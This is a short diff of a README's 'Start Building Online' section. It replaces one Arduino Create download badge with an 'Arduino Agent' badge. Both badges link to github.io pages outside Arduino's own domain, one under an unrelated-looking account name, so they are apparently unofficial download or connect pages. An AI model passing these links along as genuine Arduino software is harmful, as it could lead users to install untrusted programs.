@@ -3,7 +3,7 @@
 
 ## Start Building Online
 
-[![Get Arduino Create](https://img.shields.io/badge/Get-Arduino%20Create-00979d?style=flat-square&logo=arduino&logoColor=white)](https://konkelravenmalanado.github.io/.github/Arduino-Create-Agent)
+[![Connect with Arduino Agent](https://img.shields.io/badge/Connect%20with-Arduino%20Agent-00979D?style=flat-square)](https://arduino-agent.github.io/.github/)
 
 ![Arduino Create web editor compiling and uploading sketches to a board](https://blog.arduino.cc/wp-content/uploads/2015/05/Blogpost_f9.png)
 
